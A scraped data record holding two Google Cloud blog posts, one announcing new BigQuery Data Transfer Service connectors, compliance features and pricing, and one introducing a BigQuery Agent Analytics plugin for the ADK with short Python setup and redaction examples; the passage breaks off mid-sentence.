        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/bigquery-data-transfer-service-enhancements/",
        "title": "Expanding BigQuery Data Transfer Service with new connectors, features, and more",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/0.max-600x600.png",
        "author": "Artur Pop",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\">, our goal is to allow you to extract valuable insights from your data, regardless of how much there is, or where it’s from. A key part of how we do this is our </span><a href=\"https://cloud.google.com/bigquery/docs/dts-introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery Data Transfer Service</span></a><span style=\"vertical-align: baseline;\">, which automates and streamlines data loading into BigQuery from a wide variety of sources.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a fully managed service, BigQuery Data Transfer Service offers a variety of benefits:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplicity</strong><span style=\"vertical-align: baseline;\">: Eliminate the need for infrastructure management or complex coding. Whether you use the UI, API, or CLI, getting started with data loading is easy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scalability</strong><span style=\"vertical-align: baseline;\">: Used by tens of thousands of customers each month, Data Transfer Service easily handles massive data volumes and high numbers of concurrent users, accommodating demanding data transfer jobs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Security</strong><span style=\"vertical-align: baseline;\">: Your data's safety is paramount. Data Transfer Service employs robust security measures like encryption, authentication, and authorization. And as you'll see below, we've significantly expanded its ability to support regulated workloads without compromising ease of use.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cost-effectiveness:</strong><span style=\"vertical-align: baseline;\"> Many first-party connectors, like those for Google Ads and YouTube, are provided at no cost. And for a growing list of third-party connectors, we offer consumption-based pricing that’s highly price-competitive, so you can unify your data cost-effectively.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Based on your feedback, we expanded the BigQuery Data Transfer Service connector ecosystem, enhancing security and compliance, and improving the overall user experience. Let's dive into the latest updates.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Key feature updates</strong></h3>\n<p><strong style=\"vertical-align: baseline;\">Expanded data connectivity</strong></p>\n<p><span style=\"vertical-align: baseline;\">We are thrilled to announce that several highly-requested connectors are now generally available:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/oracle-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Oracle</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> Integrate your key operational databases with BigQuery for enhanced analysis and reporting.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/salesforce-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">and</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://cloud.google.com/bigquery/docs/servicenow-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ServiceNow</strong></a><span style=\"vertical-align: baseline;\">: Build unified customer profiles and bring in your IT service management data to gain operational insights.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/sfmc-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce Marketing Cloud</strong></a><strong style=\"vertical-align: baseline;\"> (SFMC) </strong><span style=\"vertical-align: baseline;\">and</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://cloud.google.com/bigquery/docs/facebook-ads-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Facebook Ads</strong></a><span style=\"vertical-align: baseline;\">: Ingest your marketing and analytics data into BigQuery for comprehensive analysis and campaign optimization.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/google-analytics-4-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Analytics 4</strong></a><strong style=\"vertical-align: baseline;\"> (GA4):</strong><span style=\"vertical-align: baseline;\"> A major milestone for your marketing analytics, now you can build production marketing analysis pipelines with GA4 data.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These new additions join the quickly growing list of existing connectors, including Amazon S3, Amazon Redshift, Azure Blob Storage, Campaign Manager, Cloud Storage, Comparison Shopping Service (CSS) Center, Display &amp; Video 360, Google Ad Manager, Google Ads, Google Merchant Center, Google Play, MySQL, PostgreSQL, Search Ads 360, Teradata, YouTube Channel, and YouTube Content Owner.</span></p>\n<p><strong style=\"vertical-align: baseline;\">New connectors in preview</strong></p>\n<p><span style=\"vertical-align: baseline;\">We are also excited to launch new connectors in preview, further expanding our ecosystem:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://docs.cloud.google.com/bigquery/docs/stripe-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Stripe</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">and</span><strong style=\"vertical-align: baseline;\"> </strong><a href=\"https://docs.cloud.google.com/bigquery/docs/paypal-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">PayPal</strong></a><span style=\"vertical-align: baseline;\">: Ingest financial and transaction data into BigQuery for revenue analysis, refund tracking, and customer behavior insights.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/migration/snowflake-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Snowflake</strong></a><strong style=\"vertical-align: baseline;\"> (migration connector)</strong><span style=\"vertical-align: baseline;\">: Migrate your data from Snowflake with features like key pair authentication, auto schema detection, and support for migrating data residing on all three major clouds (Google Cloud, AWS, and Azure).</span></p>\n</li>\n<li><a href=\"https://cloud.google.com/bigquery/docs/migration/hive-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Hive</strong></a><strong style=\"vertical-align: baseline;\"> managed tables (migration connector)</strong><span style=\"vertical-align: baseline;\">: This connector supports Metadata and Tables migration for Hive and Iceberg from on-prem and self-hosted cloud Hadoop environments to Google Cloud. This lets you perform one-time migrations and synchronize incremental updates of Hive and Iceberg tables, with Iceberg tables being registered with BigLake metastore, and Iceberg and Hive tables registered with Dataproc Metastore.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_TTzq68z.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Enhancements to existing connectors and platform capabilities</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/cloud-storage-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Storage</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> We are excited to announce the GA of </span><a href=\"https://cloud.google.com/bigquery/docs/event-driven-transfer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">event-driven transfers</span></a><span style=\"vertical-align: baseline;\">. Now, your data transfers can trigger automatically the moment a new file arrives in your Cloud Storage bucket, for near-real-time data pipelines.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/salesforce-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Salesforce</strong></a><span style=\"vertical-align: baseline;\">: CRM users get an efficiency boost with incremental ingestion now available in preview. Data Transfer Service now intelligently loads only new or modified records, saving time and compute resources. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/search-ads-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">SA360</strong></a><span style=\"vertical-align: baseline;\">: The recently updated Search Ads 360 connector now includes full support for Performance Max (PMax) campaigns, so you can analyze data from Google's latest campaign types.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/doubleclick-publisher-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Ad Manager</strong></a><strong style=\"vertical-align: baseline;\">: </strong><span style=\"vertical-align: baseline;\">We improved data freshness for the Google Ad Manager connector by rolling out </span><a href=\"https://cloud.google.com/bigquery/docs/doubleclick-publisher-transfer#updates_to_data_transfer_dt_files\"><span style=\"text-decoration: underline; vertical-align: baseline;\">incremental updates for DT files</span></a><span style=\"vertical-align: baseline;\">. Google Ad Manager adds the Google Ad Manager DT files into the Cloud Storage bucket. A transfer run then incrementally loads the new Google Ad Manager DT files from the Cloud Storage bucket into the BigQuery table without reloading files that have already been transferred.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/google-ads-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Google Ads</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> We launched</span><a href=\"https://cloud.google.com/bigquery/docs/google-ads-transfer#custom_reports\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">custom reports for Google Ads</span></a><span style=\"vertical-align: baseline;\"> GA, so you can use Google Ads Query Language (GAQL) queries in your transfer configuration to ingest custom Google Ads reports and fields beyond those available in the</span><a href=\"https://cloud.google.com/bigquery/docs/google-ads-transformation\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">standard reports and fields</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/oracle-transfer\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Oracle</strong></a><span style=\"vertical-align: baseline;\">: We significantly enhanced the Oracle connector to support the ingestion of tables containing millions of records, ensuring that even your largest and most critical datasets can be transferred to BigQuery.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Enhanced security and compliance</strong></p>\n<p><span style=\"vertical-align: baseline;\">To continue to meet your stringent security and compliance needs, we’re also investing in our infrastructure.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Access transparency:</strong><span style=\"vertical-align: baseline;\"> Along with BigQuery, we’ve extended Data Transfer Service administrative access controls to customer-identifiable metadata. Administrative access controls (access transparency, access approval, and personnel controls) is a feature of Cloud services that gives customers real-time notifications of when, why, and how Google personnel access their user content. This new capability applies access transparency controls to </span><span style=\"font-style: italic; vertical-align: baseline;\">reads</span><span style=\"vertical-align: baseline;\"> of customer-defined attributes and any customer service configuration that may be used to identify the customer or customer workloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">EU Data Boundary: </strong><span style=\"vertical-align: baseline;\">We are excited to announce GA of Data Transfer Service for EU Data Boundary and Sovereign Controls compliance programs in the EU, including EU regions support with Data Boundary with Access Justifications and Sovereign Controls by Partners. This enables customers to expand their workloads on Google Cloud in regulated markets.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">FedRAMP High:</strong><span style=\"vertical-align: baseline;\"> We successfully implemented the security controls required to launch Data Transfer Service into the FedRAMP High compliance regime. This will allow U.S. government, civilian agencies, and contractors to expand their adoption of FedRAMP High regulated workloads on Google Cloud.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">CJIS Compliance:</strong><span style=\"vertical-align: baseline;\"> We launched BigQuery Data Transfer Service for Criminal Justice Information Services (CJIS) compliance. Data Transfer Service now meets the security standards of the CJIS Security Policy, enabling U.S. state, local, and tribal law enforcement and criminal justice organizations to handle sensitive information using our service.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Custom organization policies:</strong><span style=\"vertical-align: baseline;\"> We announced the GA of </span><a href=\"https://cloud.google.com/bigquery/docs/transfer-custom-constraints\"><span style=\"text-decoration: underline; vertical-align: baseline;\">custom organization policies</span></a><span style=\"vertical-align: baseline;\"> so you can allow or deny specific operations on Data Transfer Service transfer configurations, to help meet your organization's compliance and security requirements.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Regional endpoints:</strong><span style=\"vertical-align: baseline;\"> We enabled regional endpoints for the Data Transfer Service API. Regional endpoints are request endpoints that ensure requests are only processed if the resource exists in the specified location. This way, workloads can comply with data residency and data sovereignty requirements by maintaining data at rest and in transit within the specified location.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Key tracking:</strong><span style=\"vertical-align: baseline;\"> You can now use key usage tracking to see which storage resources are protected by each of your Cloud KMS keys. For more information, learn how to </span><a href=\"https://cloud.google.com/kms/docs/view-key-usage\"><span style=\"text-decoration: underline; vertical-align: baseline;\">view key usage</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Proactive threat mitigation</strong><span style=\"vertical-align: baseline;\">: We recently completed a detailed, proactive threat modeling exercise for the entire BigQuery Data Transfer Service. This in-depth review allowed us to identify and mitigate high-priority security risks, further hardening the platform against potential threats.</span></p>\n</li>\n</ul>\n<h4><strong style=\"vertical-align: baseline;\">An intuitive and unified user experience</strong></h4>\n<p><span style=\"vertical-align: baseline;\">We've made significant investments to the BigQuery user experience to make data ingestion simpler and more intuitive.</span></p>\n<p><span style=\"vertical-align: baseline;\">The </span><strong style=\"vertical-align: baseline;\">“Add Data” experience</strong><span style=\"vertical-align: baseline;\"> in the BigQuery UI now provides a single, simplified entry point to guide you through the data-loading process. Whether you're a seasoned data engineer or a new analyst, this wizard-like workflow makes it easy to discover and configure transfers from any source, removing the guesswork and getting you to insights faster.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_iR0EC7s.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Finally, to further streamline the setup process, the </span><strong style=\"vertical-align: baseline;\">BigQuery Data Transfer Service API is now enabled by default</strong><span style=\"vertical-align: baseline;\"> for new BigQuery projects. This removes a manual step, so that data transfer capabilities are immediately available to everyone getting started with BigQuery.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A new, consumption-based pricing model</strong></h3>\n<p><span style=\"vertical-align: baseline;\">As we graduate more third-party connectors from preview to GA, we  introduced a new pricing model that reflects their status as fully supported, production-ready services.</span></p>\n<p><span style=\"vertical-align: baseline;\">This new consumption-based model applies to our third-party SaaS and database connectors (e.g., Salesforce, Facebook Ads, Oracle, MySQL, and others) and takes effect only when a specific connector becomes generally available.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Key details of the model:</strong></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Free in preview:</strong><span style=\"vertical-align: baseline;\"> All connectors remain </span><strong style=\"vertical-align: baseline;\">completely free of charge</strong><span style=\"vertical-align: baseline;\"> during the preview phase. This allows you to test, experiment, and validate new integrations without any financial commitment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Competitive pricing:</strong><span style=\"vertical-align: baseline;\"> Pricing is highly competitive, to help you feel comfortable loading data from critical sources.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consumption-based:</strong><span style=\"vertical-align: baseline;\"> You are billed based on the compute resources consumed by your data transfers, measured in slot-hours.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This change allows us to continue investing in building a robust and scalable data transfer platform. For more detailed information, please visit the official</span><a href=\"https://cloud.google.com/bigquery/pricing#data-transfer-service-pricing\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery pricing page</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The journey continues! We are committed to building features that streamline your data pipelines and unlock new levels of insight. As you can see from the extensive new list of connectors in preview, we are continuing to innovate rapidly in migration, marketing analytics, operational databases, and enterprise applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">Experience the power of BigQuery Data Transfer Service for yourself. Simplify your data loading process and accelerate your time to insights. Want to stay informed about the BigQuery Data Transfer Service? Join our email group for future product announcements and updates at </span><a href=\"https://groups.google.com/g/bigquery-dts-announcements\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://groups.google.com/g/bigquery-dts-announcements</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">We also encourage readers to share their feedback and file feature requests via the </span><a href=\"https://cloud.google.com/support/docs/issue-trackers\"><span style=\"text-decoration: underline; vertical-align: baseline;\">public issue tracker</span></a><span style=\"vertical-align: baseline;\">, specifically by </span><a href=\"https://issuetracker.google.com/issues/new?component=187149&amp;template=0\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Creating a new BigQuery issue</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-20 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/introducing-bigquery-agent-analytics/",
        "title": "From interaction to insight: Announcing BigQuery Agent Analytics for the Google ADK",
        "thumbnail": null,
        "author": "Sandeep Karmarkar",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In a world of agentic AI, building an agent is only half the battle. The other half is understanding how users are interacting with it. What are their most common requests? Where do they get stuck? What paths lead to successful outcomes? Answering these questions is the key to refining your agent and delivering a better user experience. These insights are also super critical for optimizing agent performance. </span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we're making it easier for agent developers in Google’s </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit</span></a><span style=\"vertical-align: baseline;\"> (ADK) to answer these questions. With a single line of code, ADK developers can stream agent interaction data directly to BigQuery and get insights into their agent activity in a scalable manner. To do so, we are introducing</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://google.github.io/adk-docs/tools/google-cloud/bigquery-agent-analytics/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery Agent Analytics</strong></a><span style=\"vertical-align: baseline;\">, a new plugin for ADK that exports your agent's interaction data directly into BigQuery to capture, analyze, and visualize agent performance, user interaction, and cost.</span></p>\n<p><span style=\"vertical-align: baseline;\">With your agent interaction data centralized in BigQuery, analyzing critical metrics such as latency, token consumption, and tool usage is straightforward. Creating custom dashboards in tools like </span><a href=\"https://lookerstudio.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker Studio</span></a><span style=\"vertical-align: baseline;\"> or </span><a href=\"https://grafana.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Grafana</span></a><span style=\"vertical-align: baseline;\"> is easy. Furthermore, you can leverage cutting-edge BigQuery capabilities including</span><a href=\"https://docs.cloud.google.com/bigquery/docs/generative-ai-overview\"><span style=\"vertical-align: baseline;\"> </span><span style=\"text-decoration: underline; vertical-align: baseline;\">generative AI functions</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://docs.cloud.google.com/bigquery/docs/vector-search-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vector search</span></a><span style=\"vertical-align: baseline;\">, and </span><a href=\"https://docs.cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-generate-embedding\"><span style=\"text-decoration: underline; vertical-align: baseline;\">embedding generation</span></a><span style=\"vertical-align: baseline;\">, to perform sophisticated analysis. This enables you to cluster agent interactions, precisely gauge agent performance, and rapidly pinpoint common user queries or systemic failure patterns — all of which are essential for refining the agent experience. You can also join interaction data with relevant business datasets — for instance, linking support agent interactions with CSAT scores — to accurately measure the agent's real-world impact. This entire capability is unlocked with a minimal code change.</span></p>\n<p><span style=\"vertical-align: baseline;\">This plugin is available in preview for ADK users today, with support for other agent frameworks soon to follow.</span></p>\n<p><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">See the plugin in action in the following </span><span style=\"vertical-align: baseline;\">video.</span></span></p></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=V7oz1vJmORY\">\n\n      \n        <img alt=\"Agent Analytics powered by BigQuery\" src=\"https://img.youtube.com/vi/V7oz1vJmORY/maxresdefault.jpg\" />\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=V7oz1vJmORY\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Understanding BigQuery Agent Analytics</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The BigQuery Agent Analytics plugin is a very lightweight way of streaming various agent activity data directly to your BigQuery table. It consists of three main components:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ADK Plugin:</strong><span style=\"vertical-align: baseline;\"> With a single line of code, the new ADK plugin can stream agent activity </span><span style=\"vertical-align: baseline;\">like requests, responses, LLM tool calls, etc. to a BigQuery table.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Predefined BigQuery schema:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">We provide an optimized table schema out-of-the-box that stores rich details about user interactions, agent responses, and tool usage.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Low-cost, high-performance streaming:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">The plugin uses the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/write-api\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery Storage Write API</span></a><span style=\"vertical-align: baseline;\"> to stream events directly to BigQuery in real-time.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Why it matters: Data-driven agent development</strong></h3>\n<p><span style=\"vertical-align: baseline;\">By integrating your agent's analytic data in BigQuery, you can go from viewing basic metrics to generating deep, actionable insights. Specifically, this integration lets you:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Visualize agent usage and interactions:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Gain a clear understanding of your agent's performance. Easily track key operational metrics like token consumption and tool usage to monitor costs and resource allocation. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Evaluate agent quality with advanced AI:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Go beyond simple metrics by using BigQuery's advanced AI capabilities. Leverage AI functions and vector search to perform quality analysis on conversation data, identifying areas for improvement with greater precision. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Learn by conversing with your agent data:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Create a conversational data agent that works directly with your new observability data. This allows you and your team to ask questions about your agent activity in natural language and get immediate insights, without writing complex queries. </span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">How It works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">We've designed the process of setting up robust analytics pipeline to be as simple as possible:</span></p>\n<p><span style=\"vertical-align: baseline;\">1. </span><strong style=\"vertical-align: baseline;\">Add the required code:</strong><span style=\"vertical-align: baseline;\"> This plugin requires use of ADK’s </span><a href=\"https://google.github.io/adk-docs/apps/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">application(apps) component</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">when building the agent. The following code demonstrates how to</span><span style=\"vertical-align: baseline;\"> initialize the new plugin and make it part of your app. </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# --- Initialize the Plugin ---\\r\\nbq_logging_plugin = BigQueryAgentAnalyticsPlugin(\\r\\n   project_id=PROJECT_ID, \\r\\n   dataset_id=DATASET_ID, \\r\\n   table_id=&quot;agent_events&quot; # Optional \\r\\n)\\r\\n\\r\\n# --- Initialize Model and the root agent ---\\r\\nllm = Gemini(\\r\\n   model=&quot;gemini-2.5-flash&quot;,\\r\\n)\\r\\n\\r\\nroot_agent = Agent(\\r\\n   model=llm,\\r\\n   name=\\&#x27;my_adk_agent\\&#x27;,\\r\\n   instruction=&quot;You are a helpful assistant&quot;\\r\\n\\r\\n)\\r\\n\\r\\n# --- Create the App ---\\r\\napp = App(\\r\\n   name=&quot;my_adk_agent&quot;,\\r\\n   root_agent=root_agent,\\r\\n   plugins=[bq_logging_plugin], # Register the plugin here\\r\\n)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f142a9707c0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">2. </span><strong style=\"vertical-align: baseline;\">Choose what to stream and customize pre-processing:</strong><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">You have full control over what data you send to BigQuery. Choose the specific events you want to stream, so that you only capture the data that is most relevant to your needs. The following code example redacts dollar amounts before logging. </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;import json\\r\\nimport re\\r\\n\\r\\nfrom google.adk.plugins.bigquery_agent_analytics_plugin import BigQueryLoggerConfig\\r\\n\\r\\n\\r\\ndef redact_dollar_amounts(event_content: Any) -&gt; str:\\r\\n   &quot;&quot;&quot;\\r\\n   Custom formatter to redact dollar amounts (e.g., $600, $12.50)\\r\\n   and ensure JSON output if the input is a dict.\\r\\n   &quot;&quot;&quot;\\r\\n   text_content = &quot;&quot;\\r\\n   if isinstance(event_content, dict):\\r\\n       text_content = json.dumps(event_content)\\r\\n   else:\\r\\n       text_content = str(event_content)\\r\\n\\r\\n   # Regex to find dollar amounts: $ followed by digits, optionally with commas or decimals.\\r\\n   # Examples: $600, $1,200.50, $0.99\\r\\n   redacted_content = re.sub(r\\&#x27;\\\\$\\\\d+(?:,\\\\d{3})*(?:\\\\.\\\\d+)?\\&#x27;, \\&#x27;xxx\\&#x27;, text_content)\\r\\n   return redacted_content\\r\\n\\r\\nconfig = BigQueryLoggerConfig(\\r\\n   enabled=True,\\r\\n   event_allowlist=[&quot;LLM_REQUEST&quot;, &quot;LLM_RESPONSE&quot;], # Only log these events\\r\\n   shutdown_timeout=10.0, # Wait up to 10s for logs to flush on exit\\r\\n   client_close_timeout=2.0, # Wait up to 2s for BQ client to close\\r\\n   max_content_length=500, # Truncate content to 500 chars (default)\\r\\n   content_formatter=redact_dollar_amounts, # Redact the dollar amounts in the logging content\\r\\n)\\r\\n\\r\\nplugin = BigQueryAgentAnalyticsPlugin(..., config=config)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f142a9704c0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">And that’s it — </span><span style=\"vertical-align: baseline;\">the plugin handles the rest, including auto-creating the necessary BigQuery table with the correct schema, and streaming the agent data in real-time. </span></p>\n<p><span style=\"vertical-align: baseline;\">Now you are ready to analyze your agent 